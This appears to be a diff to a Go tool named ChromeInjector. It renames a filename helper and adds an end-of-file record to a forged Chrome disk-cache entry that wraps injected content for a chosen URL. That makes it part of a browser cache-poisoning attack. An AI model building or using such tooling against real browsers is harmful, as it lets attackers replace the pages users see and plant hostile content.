@@ -24,20 +24,22 @@ func (self *ChromeInjector) generatePayload(urlStr string) (string, []byte) {
 	pageUrl, _ := url.Parse(urlStr)
 	cacheKey := generateCacheKey(pageUrl)
 	eHash := entryHash(cacheKey)
-	filename := self.getFilename(eHash, 0)
+	filename := self.generateFilename(eHash, 0)
 
 	contentBytes := []byte(self.InjectedContent)
 
 	fileData := make([]byte, 0)
+
 	fileData = append(fileData, fileHeader(cacheKey)[4:]...)
 	fileData = append(fileData, []byte{ 0, 0, 0, 0 }...)
 	fileData = append(fileData, cacheKey...)
 	fileData = append(fileData, contentBytes...)
+	fileData = append(fileData, fileEofData(contentBytes, 1)...)
 
 	return filename, fileData
 }
 
-func (self *ChromeInjector) getFilename(
+func (self *ChromeInjector) generateFilename(
     entryHash uint64,
     fileIndex int,
 ) string {
